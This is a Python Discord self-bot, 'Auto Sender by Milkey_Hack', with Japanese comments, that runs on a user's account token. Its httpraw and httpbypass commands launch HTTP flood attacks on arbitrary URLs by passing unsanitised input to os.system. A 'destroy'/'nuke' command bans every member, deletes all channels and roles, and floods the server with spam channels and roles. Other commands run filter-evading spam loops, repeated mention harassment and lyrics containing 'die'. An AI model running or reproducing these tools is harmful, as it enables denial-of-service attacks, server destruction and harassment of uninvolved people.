import discord
print("Discord.py is Loaded")
from discord.ext import commands
import colorama
print("colorama is Loaded")
import random
print("random is Loaded")
import string
print("string is Loaded")
import time
print("time is Loaded")
from colorama import Fore
print("colorama - Fore is Loaded")
import asyncio
print("asyncio is Loaded")
import requests
print("requests is Loaded")
import sys
print("sys is Loaded")
import threading
print("threading is Loaded")
import datetime
print("datetime is Loaded")
import json
print("json is Loaded")
import aiohttp
print("aiohttp is Loaded")
import urllib.request, urllib.error
print("urllib is Loaded")
from bs4 import BeautifulSoup
print("bs4 is Loaded")
from pypresence import Presence
print("pypresence is Loaded")
import subprocess
print("subprocess is Loaded")
import base64
print("base64 is Loaded")
import codecs
print("codes is Loaded")
import smtplib
print("smtplib is Loaded")
import re
print("re is Loaded")
from captcha.image import ImageCaptcha
print("captcha is Loaded")
import datetime
print("datetime is Loaded")
import os
print("os is Loaded")
#-----SETUP-----#

prefix = "au!"

token = input(f"{Fore.LIGHTCYAN_EX}Your Token Here:")

music = "Awesome Code"

length_of_string = 4

Test2 = 8

Test3 = 5

Test4 = 12

Test5 = 2

Test6 = random.randrange(1, 30, 2)

Random = random.randrange(3, 7, 2)

result = ["大吉", "中吉", "小吉", "吉", "末吉", "凶", "大凶"]

result2 = ["裏\n知っていましたか?実は1セント硬貨で行うコイントスは\nリンカーン側に80％で倒れるそうですよ。", "表\n知っていましたか?両面が同じ重さのコインでコイントスをした場合表が5回連続で出る確率は0.03125％らしいですよ。"]

bot = commands.Bot(command_prefix=prefix,
                   help_command=None,
                   case_insensitive=True,
                   self_bot=True)

sent = 1

turn = 0

msg = round(turn * 20)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

#---------------#

@bot.command()
async def help(ctx):
  await ctx.message.delete()
  await ctx.send("Error出て出来ないのでこれ見てください。\nhttps://pastebin.com/GR9FGtL4")
  await ctx.message.delete()

@bot.command(pass_context=True)
async def automsg1(ctx):
	await ctx.message.delete()
	await ctx.send('autoMassage Sender is now **enabled**!')
	global dmcs
	dmcs = True
	while dmcs:
		async with ctx.typing():
			await asyncio.sleep(3)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||あなたの両腕を切り落として　私の腰に巻き付ければ")
			print(f"{Fore.GREEN}succefully one{Fore.WHITE}")
			await asyncio.sleep(4)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||あなたはもう二度と　他の女を抱けないわ")
			print(f"{Fore.GREEN}succefully Two{Fore.WHITE}")
			await asyncio.sleep(2)
			await ctx.send("||" +''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||あなたの両目をくり抜いて　私のポッケに入れたなら")
			print(f"{Fore.GREEN}succefully Tree{Fore.WHITE}")
			await asyncio.sleep(4)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||あなたの最後の記憶は　私であるはずよね")
			print(f"{Fore.GREEN}succefully 4{Fore.WHITE}")
			await asyncio.sleep(3)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||逃さないよ　離さないよ　私だけのあなたになるの")
			print(f"{Fore.GREEN}succefully Five{Fore.WHITE}")
			await asyncio.sleep(7)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||今すぐ部屋においで")
			print(f"{Fore.GREEN}succefully 7{Fore.WHITE}")
			await asyncio.sleep(6)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||ねえ？　どうしてそばに来てくれないの")
			print(f"{Fore.GREEN}succefully 8{Fore.WHITE}")
			await asyncio.sleep(4)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||死ね。　私を好きじゃないのならば")
			print(f"{Fore.GREEN}succefully 9{Fore.WHITE}")
			await asyncio.sleep(2)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||あなたの心臓をえぐりとって　私のネックレスにしたなら")
			print(f"{Fore.GREEN}succefully 10{Fore.WHITE}")
			await asyncio.sleep(7)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||私が眠るその時まで　あなたを感じられる")
			print(f"{Fore.GREEN}succefully 11{Fore.WHITE}")
			await asyncio.sleep(8)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||どこに行くの　行かせないよ　私だけが隣にいたいの")
			print(f"{Fore.GREEN}succefully 12{Fore.WHITE}")
			await asyncio.sleep(4)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||いいから部屋においで")
			print(f"{Fore.GREEN}succefully 13{Fore.WHITE}")
			await asyncio.sleep(4)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||ねえ？　どうして私から逃げ出すの")
			print(f"{Fore.GREEN}succefully 14{Fore.WHITE}")
			await asyncio.sleep(6)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||死ね。　あなたを愛しているのに")
			print(f"{Fore.GREEN}succefully 15{Fore.WHITE}")
			await asyncio.sleep(5)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||誰にもあげない　触れさせやしない")
			print(f"{Fore.GREEN}succefully 16{Fore.WHITE}")
			await asyncio.sleep(3)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||あなたがもしも他の人と手を繋いでるのを見たら")
			print(f"{Fore.GREEN}succefully 17{Fore.WHITE}")
			await asyncio.sleep(5)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||指を喰いちぎるわ")
			print(f"{Fore.GREEN}succefully 18{Fore.WHITE}")
			await asyncio.sleep(7)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||足を引き裂き　歩かせやしない")
			print(f"{Fore.GREEN}succefully 19{Fore.WHITE}")
			await asyncio.sleep(4)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||唇を縫い　私だけのキスを味わえばいいの")
			print(f"{Fore.GREEN}succefully 20{Fore.WHITE}")
			await asyncio.sleep(5)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||ねえ？　私はどこかおかしいですか")
			print(f"{Fore.GREEN}succefully 21{Fore.WHITE}")
			await asyncio.sleep(2)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||好きすぎて　あなたが欲しすぎて")
			print(f"{Fore.GREEN}succefully 22{Fore.WHITE}")
			await asyncio.sleep(6)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||ねえ？　どうしてそばに来てくれないの")
			print(f"{Fore.GREEN}succefully 23{Fore.WHITE}")
			await asyncio.sleep(4)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||死ね。　私を好きじゃないのならば")
			print(f"{Fore.GREEN}succefully 24{Fore.WHITE}")
			await asyncio.sleep(2)
			await ctx.send("https://cdn.discordapp.com/attachments/870583551849025546/917430594823139338/t.PNG")
			print(f"{Fore.GREEN}succefully 25{Fore.WHITE}")

@bot.command(pass_context=True)
async def AntiWick(ctx):
	await ctx.message.delete()
	await ctx.send('autoMassage Sender is now **enabled**!')
	global dmcs
	global sent
	global turn
	dmcs = True
	while dmcs:
		async with ctx.typing():
			print(f"{Fore.WHITE}<-------------------------------------------------------------------->")
			print(f"{Fore.GREEN}いまなんしゅ～め?: %s{Fore.WHITE}" % turn)
			print(f"{Fore.GREEN}いまだいたいなんめっせーじ?: %s{Fore.WHITE}" % msg)
			print(f"{Fore.WHITE}<-------------------------------------------------------------------->")
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(Test2)))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(Test3)))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(Test4)))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(Test6)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(Test5)))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randrange(1, 15, 2))))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randrange(5, 12, 2))))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randrange(3, 6, 2))))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randrange(6, 15, 2))))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randrange(2, 4, 2))))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(Test6)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(Test5)))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(Test3)))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(Test4)))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send(''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12)) + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(Test5)))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randrange(1, 15, 2))))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randrange(5, 12, 2))))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randrange(3, 6, 2))))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randrange(6, 15, 2))))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_of_string)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randrange(2, 4, 2))))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			await asyncio.sleep(Random)
			await ctx.send("||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(Test6)) + "||" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(Test5)))
			print(f"{Fore.GREEN}succefully %s{Fore.WHITE}" % sent)
			sent += 1
			turn += 1
			await asyncio.sleep(Random)

@bot.command(pass_context=True)
async def probotmode(ctx):
	await ctx.message.delete()
	await ctx.send("autoMassage Sender is now **enabled**!")
	global dmcs
	dmcs = True
	while dmcs:
		async with ctx.typing():
			await asyncio.sleep(1)
			await ctx.send("a")
			print(f"{Fore.GREEN}succefully one")
			await asyncio.sleep(3)
			await ctx.send("try")
			print(f"{Fore.GREEN}succefully Two")
			await ctx.send("red")
			print(f"{Fore.GREEN}succefully Tree")
			await asyncio.sleep(2)
			await ctx.send("i")
			print(f"{Fore.GREEN}succefully 4")
			await asyncio.sleep(6)
			await ctx.send("lot")
			print(f"{Fore.GREEN}succefully Five")
			await asyncio.sleep(1)
			await ctx.send("lol")
			print(f"{Fore.GREEN}succefully 7")
			await asyncio.sleep(2)
			await ctx.send("ghd")
			print(f"{Fore.GREEN}succefully 8")
			await asyncio.sleep(7)
			await ctx.send("ydt")
			print(f"{Fore.GREEN}succefully 9")
			await asyncio.sleep(2)
			await ctx.send("4/2022")
			print(f"{Fore.GREEN}succefully 10")
			await asyncio.sleep(3)
			await ctx.send("zrx")
			print(f"{Fore.GREEN}succefully 11")
			await asyncio.sleep(4)
			await ctx.send("#rank")
			print(f"{Fore.GREEN}succefully 12")
			await asyncio.sleep(4)
			await ctx.send("#top")
			print(f"{Fore.GREEN}succefully 13")
			await asyncio.sleep(2)

@bot.command()
async def キャプチャ(ctx, moji):
  image = ImageCaptcha(fonts=['path/C.ttf', 'path/C.ttf'])
  await ctx.message.delete()
  print(f"{Fore.GREEN}succefully MsgDel")
  data = image.generate(f'{moji}')
  image.write(f'{moji}', 'out.png')
  await ctx.send(file=discord.File("warn.png"))
  await ctx.send(file=discord.File("out.png"))

@bot.command()
async def httpraw(ctx, url, time):
  await ctx.message.delete()
  await ctx.send(f"Attack is Sented!!\n```\nTarget                   Duration     Methods\n{url}     {time}Seconds     HTTP-RAW\n```")
  print(f"Attacked HTTP-RAW Target:{url} Duration:{time}")
  os.system(f'./http-raw {url} {time}')
  await ctx.send("Attack is Stoped!!")

@bot.command()
async def httpbypass(ctx, url, time):
  await ctx.message.delete()
  await ctx.send(f"Attack is Sented!!\n```\nTarget                   Duration     Methods\n{url}     {time}Seconds     HTTP-BYPASS\n```")
  print(f"Attacked HTTP-BYPASS Target:{url} Duration:{time}")
  os.system(f'./http-bypass {url} {time}')
  await ctx.send("Attack is Stoped!!")

@bot.command()
async def おすすめ(ctx):
  URL = "https://www.mirrativ.com/api/live/catalog?id=2&cursor="
  Header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36", "accept-language": "ja,en-US;q=0.9,en;q=0.8"}
  resp = requests.get(URL, timeout=500000, headers=Header)
  await ctx.message.delete()
  print(f"{Fore.GREEN}succefully MsgDel")
  f = open('output2.txt', 'a', encoding='UTF-8')
  f.write(resp.text)
  await ctx.send(file=discord.File("output2.txt"))
  f.truncate(0)

@bot.command()
async def アプリ指定サーチ(ctx, Appid):
  URL = f"https://www.mirrativ.com/api/app/app_page?app_id={Appid}&page=1"
  Header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36", "accept-language": "ja,en-US;q=0.9,en;q=0.8"}
  resp = requests.get(URL, timeout=500000, headers=Header)
  await ctx.message.delete()
  print(f"{Fore.GREEN}succefully MsgDel")
  f = open('output.txt', 'a', encoding='UTF-8')
  f.write(resp.text)
  f.close
  f = open('output.txt', 'a', encoding='UTF-8')
  f.write(resp.text)
  await ctx.send(file=discord.File("output.txt"))
  f.truncate(0)

@bot.command()
async def プロフ(ctx, uid):
  URL = f"https://www.mirrativ.com/api/user/profile?user_id={uid}"
  Header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36", "accept-language": "ja,en-US;q=0.9,en;q=0.8"}
  resp = requests.get(URL, timeout=500000, headers=Header)
  await ctx.message.delete()
  print(f"{Fore.GREEN}succefully MsgDel")
  f = open('output3.txt', 'a', encoding='UTF-8')
  f.write(resp.text)
  f.close
  f = open('output.txt', 'a', encoding='UTF-8')
  f.write(resp.text)
  await ctx.send(file=discord.File("output3.txt"))
  f.truncate(0)

@bot.command()
async def 配信(ctx, LiveID):
  URL = f"https://www.mirrativ.com/api/live/live?live_id={LiveID}"
  Header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36", "accept-language": "ja,en-US;q=0.9,en;q=0.8"}
  resp = requests.get(URL, timeout=500000, headers=Header)
  await ctx.message.delete()
  print(f"{Fore.GREEN}succefully MsgDel")
  f = open('output5.txt', 'a', encoding='UTF-8')
  f.write(resp.text)
  f.close
  f = open('output.txt', 'a', encoding='UTF-8')
  f.write(resp.text)
  await ctx.send(file=discord.File("output5.txt"))
  f.truncate(0)

@bot.command()
async def 配信履歴(ctx, uid):
  URL = f"https://www.mirrativ.com/api/live/live_history?user_id={uid}&page=1"
  Header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36", "accept-language": "ja,en-US;q=0.9,en;q=0.8"}
  resp = requests.get(URL, timeout=500000, headers=Header)
  await ctx.message.delete()
  print(f"{Fore.GREEN}succefully MsgDel")
  f = open('output4.txt', 'a', encoding='UTF-8')
  f.write(resp.text)
  await ctx.send(file=discord.File("output4.txt"))
  f.truncate(0)

@bot.command()
async def キャプチャ2(ctx, moji, font):
  image = ImageCaptcha(fonts=[f'path/{font}.ttf', f'path/{font}.ttf'])
  await ctx.message.delete()
  print(f"{Fore.GREEN}succefully MsgDel")
  data = image.generate(f'{moji}')
  image.write(f'{moji}', 'out.png')
  await ctx.send(file=discord.File("out.png"))

@bot.command()
async def コイントス(ctx):
  await ctx.message.delete()
  print(f"{Fore.GREEN}succefully MsgDel")
# Resultという関数を使い分かりやすくする。 
  await ctx.send(f"コイントス {ctx.author}さん | 結果発表～:" + random.choice(result2))
  print(f"{Fore.RED}<---------------------------------------->")
  print(f"{Fore.GREEN}succefully コイントス")
  print(f"{Fore.GREEN}Command Runner is | {ctx.author}")
  print(f"{Fore.RED}<---------------------------------------->")
  await asyncio.sleep(15)

@bot.command()
async def おみくじ(ctx):
  await ctx.message.delete()
  print(f"{Fore.GREEN}succefully MsgDel")
  await ctx.send(f"おみくじ {ctx.author}さん | 結果発表～:" + random.choice(result))
  print(f"{Fore.RED}<---------------------------------------->")
  print(f"{Fore.GREEN}succefully おみくじ")
  print(f"{Fore.GREEN}Command Runner is | {ctx.author}")
  print(f"{Fore.RED}<---------------------------------------->")

@bot.command()
async def autoping(ctx, channelid: int, minutes: int, id: int, num: int):
    await ctx.message.delete()
    channel = bot.get_channel(channelid)
    amt = minutes * 60
    for i in range(num):
        await channel.send(f"<@{id}>へのメンション")
        await asyncio.sleep(amt)

@bot.command()
async def ping(ctx):
    await ctx.message.delete()
    raw_ping = bot.latency
    ping = round(raw_ping * 1000)
    print(f"{Fore.GREEN}succefully MsgDel")
    await ctx.send(f"Ping a Pong!\n{ping} ms")
    print(f"{Fore.RED}<---------------------------------------->")
    print(f"{Fore.GREEN}succefully Ping")
    print(f"{Fore.GREEN}Command Runner is | {ctx.author}")
    print(f"Ping is {ping}ms")
    print(f"{Fore.RED}<---------------------------------------->")
    await asyncio.sleep(15)

@bot.command(aliases=["rekt", "nuke"])
async def destroy(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="AutoSenderMassBAN LOL",
            reason="MassBanned",
            icon=None,
            banner=None)
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="Nuked-by-AutoSender.")
        print(f"{Fore.RED}<---------------------------------------->")
        print(f"{Fore.GREEN}succefully NukeChannel")
        print(f"{Fore.GREEN}Command Runner is | {ctx.author}")
        raw_ping = bot.latency
        ping = round(raw_ping * 1000)
        print(f"Ping is {ping}ms")
        print(f"{Fore.RED}<---------------------------------------->")
    for _i in range(250):
        await ctx.guild.create_role(name="AutoSender", color=RandomColor())
        print(f"{Fore.RED}<---------------------------------------->")
        print(f"{Fore.GREEN}succefully NukeRole")
        print(f"{Fore.GREEN}Command Runner is | {ctx.author}")
        raw_ping = bot.latency
        ping = round(raw_ping * 1000)
        print(f"Ping is {ping}ms")
        print(f"{Fore.RED}<---------------------------------------->")

@bot.command()
async def なう(ctx):
    dt = datetime.datetime.today()
    await ctx.send(f"{dt.year}:{dt.month}:{dt.day}:{dt.hour}:{dt.minute}:{dt.second}.{dt.microsecond}")
    await asyncio.sleep(15)
    print(f"{Fore.RED}<---------------------------------------->")
    print(f"{Fore.GREEN}succefully Now")
    print(f"{Fore.GREEN}Command Runner is | {ctx.author}")
    print(f"{Fore.RED}<---------------------------------------->")
    await ctx.message.delete()

@bot.command()
async def Now(ctx):
    dt = datetime.datetime.today()
    await ctx.send(f"{dt.year}:{dt.month}:{dt.day}:{dt.hour}:{dt.minute}:{dt.second}.{dt.microsecond}")
    await asyncio.sleep(15)
    print(f"{Fore.RED}<---------------------------------------->")
    print(f"{Fore.GREEN}succefully Now")
    print(f"{Fore.GREEN}Command Runner is | {ctx.author}")
    print(f"{Fore.RED}<---------------------------------------->")
    await ctx.message.delete()

@bot.command()
async def 時刻(ctx):
    dt = datetime.datetime.today()
    await ctx.send(f"{dt.year}:{dt.month}:{dt.day}:{dt.hour}:{dt.minute}:{dt.second}.{dt.microsecond}")
    await asyncio.sleep(15)
    print(f"{Fore.RED}<---------------------------------------->")
    print(f"{Fore.GREEN}succefully Now")
    print(f"{Fore.GREEN}Command Runner is | {ctx.author}")
    print(f"{Fore.RED}<---------------------------------------->")
    await ctx.message.delete()

@bot.command()
async def 現在時刻(ctx):
    dt = datetime.datetime.today()
    await ctx.send(f"{dt.year}:{dt.month}:{dt.day}:{dt.hour}:{dt.minute}:{dt.second}.{dt.microsecond}")
    await asyncio.sleep(15)
    print(f"{Fore.RED}<---------------------------------------->")
    print(f"{Fore.GREEN}succefully Now")
    print(f"{Fore.GREEN}Command Runner is | {ctx.author}")
    print(f"{Fore.RED}<---------------------------------------->")
    await ctx.message.delete()

@bot.command()
async def ナウ(ctx):
    dt = datetime.datetime.today()
    await ctx.send(f"{dt.year}:{dt.month}:{dt.day}:{dt.hour}:{dt.minute}:{dt.second}.{dt.microsecond}")
    await asyncio.sleep(15)
    print(f"{Fore.RED}<---------------------------------------->")
    print(f"{Fore.GREEN}succefully Now")
    print(f"{Fore.GREEN}Command Runner is | {ctx.author}")
    print(f"{Fore.RED}<---------------------------------------->")
    await ctx.message.delete()

@bot.command()
async def NowTime(ctx):
    dt = datetime.datetime.today()
    await ctx.send(f"{dt.year}:{dt.month}:{dt.day}:{dt.hour}:{dt.minute}:{dt.second}.{dt.microsecond}")
    await asyncio.sleep(15)
    print(f"{Fore.RED}<---------------------------------------->")
    print(f"{Fore.GREEN}succefully Now")
    print(f"{Fore.GREEN}Command Runner is | {ctx.author}")
    print(f"{Fore.RED}<---------------------------------------->")
    await ctx.message.delete()

@bot.command()
async def table(ctx):
    list = (
        "`(\°-°)\  ┬─┬`",
        "`(\°□°)\  ┬─┬`",
        "`(-°□°)-  ┬─┬`",
        "`(╯°□°)╯    ]`",
        "`(╯°□°)╯     ┻━┻`",
         "`(╯°□°)╯       [`",
        "`(╯°□°)╯          ┬─┬`",
        "`(╯°□°)╯                 ]`",
        "`(╯°□°)╯                  ┻━┻`",
        "`(╯°□°)╯                         [`",
        "`(\°-°)\                               ┬─┬`",
    )
    for i in list:
        await asyncio.sleep(1.5)
        await ctx.message.edit(content=i)
        print(f"{Fore.RED}<---------------------------------------->")
        print(f"{Fore.GREEN}succefully Table")
        print(f"{Fore.GREEN}Command Runner is | {ctx.author}")
        print(f"{Fore.RED}<---------------------------------------->")
        await asyncio.sleep(15)
        await ctx.message.delete()

@bot.command()
async def Loading(ctx):
    list = (
        "```                    Loading |            ```",
        "```                    Loading /            ```",
        "```                    Loading -            ```",
        "```                    Loaded!!             ```",
        "```Progress Bar -> □□□□□□□□□□ 0%  ```",
        "```Progress Bar -> █□□□□□□□□□ 12%  ```",
        "```Progress Bar -> ██□□□□□□□□  24%  ```",
        "```Progress Bar -> ███□□□□□□□   30%  ```",
        "```Progress Bar -> ████□□□□□□    46%  ```",
        "```Progress Bar -> ███████□□□       70%  ```",
        "```Progress Bar -> ████████□□        82%  ```",
        "```Progress Bar -> ██████████          101% ```",
        "```                Maded by Milked          ```",
    )
    for i in list:
        await asyncio.sleep(0.3)
        await ctx.message.edit(content=i)
        print(f"{Fore.RED}<---------------------------------------->")
        print(f"{Fore.GREEN}succefully Loading")
        print(f"{Fore.GREEN}Command Runner is | {ctx.author}")
        print(f"{Fore.RED}<---------------------------------------->")

@bot.command()
async def slide( ctx):
    list = (
        "```k```",
        "```ck```",
        "```ack```",
        "```Hack```",
        "```_Hack```",
        "```y_Hack```",
        "```ey_Hack```",
        "```key_Hack```",
        "```lkey_Hack```",
        "```ilkey_Hack```",
        "```Milkey_Hack```",
        "``` Milkey_Hack```",
        "```y Milkey_Hack```",
        "```by Milkey_Hack```",
        "``` by Milkey_Hack```",
        "```r by Milkey_Hack```",
        "```er by Milkey_Hack```",
        "```der by Milkey_Hack```",
        "```nder by Milkey_Hack```",
        "```ender by Milkey_Hack```",
        "```Sender by Milkey_Hack```",
        "``` Sender by Milkey_Hack```",
        "```o Sender by Milkey_Hack```",
        "```to Sender by Milkey_Hack```",
        "```uto Sender by Milkey_Hack```",
        "```Auto Sender by Milkey_Hack```",
        "```Free Best SelfBot```",
        "```100% VirusFree```",
        "```       Data_Null        ```",
    )
    for i in list:
        await asyncio.sleep(1)
        await ctx.message.edit(content=i)
        print(f"{Fore.RED}<---------------------------------------->")
        print(f"{Fore.GREEN}succefully Slide")
        print(f"{Fore.GREEN}Command Runner is | {ctx.author}")
        print(f"{Fore.RED}<---------------------------------------->")

@bot.command()
async def backup(ctx):  # b"\xfc"
    await ctx.message.delete()
    for friend in bot.user.friends:
        friendlist = (friend.name) + "#" + (friend.discriminator)
        with open("Backups/friends.txt", "a+") as f:
            f.write(friendlist + "\n")
            print(f"{Fore.GREEN}[-] {Fore.WHITE}Saved Friend {friend} To friends.txt")
    for block in bot.user.blocked:
        blocklist = (block.name) + "#" + (block.discriminator)
        with open("Backups/blocked.txt", "a+") as f:
            f.write(blocklist + "\n")
            print(f"{Fore.GREEN}[-] {Fore.WHITE}Saved Blocked User {friend} To blocked.txt")

@bot.command(pass_context=True)
async def autolover(ctx, prefix):
 await ctx.message.delete()
 await ctx.send("autoMusic Sender is now **enabled**!")
 await ctx.send(f"{prefix}p https://youtu.be/7eXZZdaXRXc")
 print(f"{Fore.GREEN}succefully one")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/n7ZmBBf5-7g")
 print(f"{Fore.GREEN}succefully Two")
 await ctx.send(f"{prefix}p https://youtu.be/8pm_KoguqPM")
 print(f"{Fore.GREEN}succefully Tree")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/a1GiXGB0Lbs")
 print(f"{Fore.GREEN}succefully 4")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/z8IpY_XeusQ")
 print(f"{Fore.GREEN}succefully Five")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/JW3N-HvU0MA")
